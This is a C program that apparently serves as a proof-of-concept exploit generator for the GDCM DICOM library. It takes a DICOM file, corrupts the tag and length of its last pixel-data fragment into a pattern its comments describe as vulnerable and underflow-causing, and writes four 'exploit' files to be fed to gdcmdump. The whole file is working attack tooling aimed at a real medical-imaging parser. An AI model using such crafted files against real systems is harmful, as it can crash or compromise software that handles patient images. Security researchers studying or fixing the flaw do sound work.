#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>

int main(int argc, char* argv[]) {
    if (argc != 3) {
        printf("Usage: %s <input.dcm> <output.dcm>\n", argv[0]);
        return 1;
    }
    
    FILE* fin = fopen(argv[1], "rb");
    if (!fin) return 1;
    
    fseek(fin, 0, SEEK_END);
    long size = ftell(fin);
    fseek(fin, 0, SEEK_SET);
    
    uint8_t* data = (uint8_t*)malloc(size);
    fread(data, 1, size, fin);
    fclose(fin);
    
    printf("File: %s (%ld bytes)\n", argv[1], size);
    
    // Find all fragments
    long fragment_positions[100];
    int frag_count = 0;
    
    for (long i = 0; i < size - 8; i++) {
        if (data[i] == 0xFE && data[i+1] == 0xFF && 
            data[i+2] == 0x00 && data[i+3] == 0xE0) {
            fragment_positions[frag_count++] = i;
            printf("Found fragment #%d at 0x%lx\n", frag_count, i);
        }
    }
    
    if (frag_count < 2) {
        printf("Need at least 2 fragments\n");
        free(data);
        return 1;
    }
    
    // Target the LAST fragment
    long target = fragment_positions[frag_count - 1];
    
    printf("\nTargeting last fragment at 0x%lx\n", target);
    
    // Create 4 different test files with different group/element combinations
    struct {
        uint8_t group_low;   // Should be 0xE0
        uint8_t group_high;
        uint8_t elem_low;
        uint8_t elem_high;   // Should be 0x00
        uint32_t length;
        const char* suffix;
    } tests[] = {
        {0xE0, 0x11, 0x11, 0x00, 2, "_11E0_0011_len2"},  // Group=0x11E0, Elem=0x0011
        {0xE0, 0x22, 0x22, 0x00, 1, "_22E0_0022_len1"},  // Group=0x22E0, Elem=0x0022
        {0xE0, 0x33, 0x33, 0x00, 0, "_33E0_0033_len0"},  // Group=0x33E0, Elem=0x0033
        {0xE0, 0x44, 0x44, 0x00, 2, "_44E0_0044_len2"},  // Group=0x44E0, Elem=0x0044
    };
    
    for (int t = 0; t < 4; t++) {
        uint8_t* modified = (uint8_t*)malloc(size);
        memcpy(modified, data, size);
        
        // Modify the tag to match vulnerable pattern
        modified[target]     = tests[t].group_low;    // Group low = 0xE0
        modified[target + 1] = tests[t].group_high;   // Group high
        modified[target + 2] = tests[t].elem_low;     // Element low
        modified[target + 3] = tests[t].elem_high;    // Element high = 0x00
        
        // Modify length
        modified[target + 4] = tests[t].length & 0xFF;
        modified[target + 5] = (tests[t].length >> 8) & 0xFF;
        modified[target + 6] = (tests[t].length >> 16) & 0xFF;
        modified[target + 7] = (tests[t].length >> 24) & 0xFF;
        
        // Ensure the byte at position (length-3) would be 0xFE if length>=3
        // But with length<3, we're causing underflow anyway
        
        char outfile[256];
        sprintf(outfile, "exploit%s.dcm", tests[t].suffix);
        
        FILE* fout = fopen(outfile, "wb");
        if (fout) {
            fwrite(modified, 1, size, fout);
            fclose(fout);
            printf("Created: %s\n", outfile);
            printf("  Tag: (%02x%02x,%02x%02x) - Group low=0x%02x, Elem high=0x%02x\n",
                   tests[t].group_high, tests[t].group_low,
                   tests[t].elem_high, tests[t].elem_low,
                   tests[t].group_low, tests[t].elem_high);
            printf("  Length: %d\n", tests[t].length);
        }
        
        free(modified);
    }
    
    free(data);
    
    printf("\n========================================\n");
    printf("TEST ALL FILES:\n");
    printf("========================================\n");
    printf("gdcmdump.exe exploit_11E0_0011_len2.dcm\n");
    printf("gdcmdump.exe exploit_22E0_0022_len1.dcm\n");
    printf("gdcmdump.exe exploit_33E0_0033_len0.dcm\n");
    printf("gdcmdump.exe exploit_44E0_0044_len2.dcm\n");
    
    return 0;
}